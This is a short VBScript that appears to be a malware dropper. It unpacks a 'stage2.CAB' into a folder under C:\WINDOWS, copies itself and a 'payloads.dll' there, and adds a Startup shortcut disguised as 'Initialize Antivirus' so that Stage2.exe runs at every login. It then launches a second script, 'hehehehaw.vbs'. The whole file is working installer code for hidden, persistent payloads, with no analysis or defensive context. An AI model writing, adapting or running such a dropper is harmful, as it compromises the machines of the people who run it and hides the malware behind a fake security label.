Set objShell = CreateObject("Wscript.Shell")
set objFS = CreateObject("Scripting.FileSystemObject")
path = Left(Wscript.ScriptFullName, len(Wscript.ScriptFullName) - len(Wscript.ScriptName))
dst = "C:\WINDOWS\stg2"

if not objFS.FolderExists(dst) then objFS.CreateFolder(dst)
if not objFS.FolderExists(dst & "\rep") then objFS.CreateFolder(dst & "\rep")
objShell.Run "extract /E /L """ & dst & """ """ & path & "stage2.CAB"""
objShell.Run "command /c copy """ & path & "stage2.CAB"" """ & dst & "\rep"""
objShell.Run "command /c copy """ & Wscript.ScriptFullName & """ """ & dst & "\rep\setup.vbs"""
objShell.Run "command /c copy """ & dst & "\payloads.dll"" """ & dst & "\PAYLOADSDLL.DLL"""

set objShortcut = objShell.CreateShortcut( objShell.SpecialFolders("Startup") & "\initav.lnk" )
objShortcut.TargetPath = dst & "\Stage2.exe"
objShortcut.WorkingDirectory = dst
objShortcut.Description = "Initialize Antivirus"
objShortcut.Save

objShell.Run path & "hehehehaw.vbs", 1
